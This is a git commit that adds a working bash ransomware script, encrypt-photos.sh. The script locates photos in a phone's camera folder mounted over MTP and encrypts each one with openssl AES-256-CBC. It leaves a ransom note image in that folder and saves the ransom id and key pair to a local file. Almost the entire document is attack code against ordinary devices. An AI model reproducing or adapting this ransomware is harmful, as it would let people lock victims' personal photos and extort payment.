150b71cf33bea769028b11d293b5fec72e1b29d4
grant273 <grant.klich@gmail.com>
2017-01-19 04:52:49 +0000

    Add files via upload
    File encryption is functioning. It successfully can encrypt files on a phone.

--- encrypt-photos.sh
+++ encrypt-photos.sh
@@ -1,26 +1,42 @@
 #!/bin/bash
-#This script encrypts photos found in the DCIM folder, as well as leaves behind a nasty ransom letter...
+#This script finds and encrypts photos found in the camera folder, as well as leaves behind a nasty ransom letter.
 
-PHONEPATH=$(echo /run/user/$UID/gvfs/mtp*/*) #TODO escape spaces somehow
-LOCALPATH=$(echo ~/Desktop/phone-nab)
+PHONEPATH=$(echo /run/user/$UID/gvfs/mtp*/*/DCIM/CameraDev)
+
+LOCALPATH=$(pwd)
+
 echo $PHONEPATH
-pwd
+
 
 #drop ransom note
 ransomid=$(openssl rand 16 -hex)
-cp "$LOCALPATH/media/ransomnote.png" "$PHONEPATH/DCIM/Camera/ransom_$ransomid.png"
+echo "Dropping note..."
+cp "media/ransomnote.png" "$PHONEPATH/ransom_$ransomid.png"
+echo "Note dropped as ransom_$ransomid.png"
+echo ""
+echo ""
+
 
 #encrypt files. REMINDER: don't encrypt the note
 enc_key=$(openssl rand 16 -hex)
-$filecount=$('ls -1 | wc -l')
-$currentfile=1
-for f in $PHONEPATH/DCIM/Camera/*
+
+cd "$PHONEPATH"
+
+currentfile=1
+filecount=$(ls -1 | grep -v "ransom" | grep -v ".lol" | wc -l)
+ 
+for f in *
 do 
-	echo '$f ($currentfile/$filecount) encrypting...'
-	[-f $f] && [ $f -ne ransom_$ransomid.png] && openssl aes-256-cbc -a -salt -in $f -out $f.lol -k $enc_key
-	$currentfile=$(($currentfile+1))
+	
+	if [[ $f != "ransom"* ]] && [[ $f != *".lol" ]]; then
+		echo "encrypting $f ($currentfile/$filecount)..."
+		openssl aes-256-cbc -a -salt -in $f -out $f.lol -k $enc_key
+		#dont forget to delete orginal file
+		currentfile=$((currentfile+1))
+	fi
+
 done
 
-echo $ransomid $enc_key > $LOCALPATH/keys/keys.txt
-
-	
+cd $LOCALPATH 
+echo $ransomid $enc_key >> keys/keys.txt #store ransomid and encryption key pair
+echo Encryption complete. check keys/keys.txt for ransom id and key
